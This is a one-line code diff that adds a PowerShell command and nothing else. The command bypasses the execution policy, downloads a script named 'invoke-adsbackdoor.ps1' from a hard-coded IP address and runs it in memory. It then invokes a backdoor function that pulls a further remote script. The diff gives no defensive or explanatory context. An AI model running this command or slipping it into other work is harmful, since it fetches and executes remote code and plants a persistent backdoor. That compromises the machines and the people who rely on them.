@@ -1,0 +1,1 @@
+powershell.exe -exec bypass -c "iex (new-object net.webclient).downloadstring('http://52.255.152.184:8080/invoke-adsbackdoor.ps1');Invoke-ADSBackdoor -URL http://52.255.152.184:8080/ps-remote.ps1"
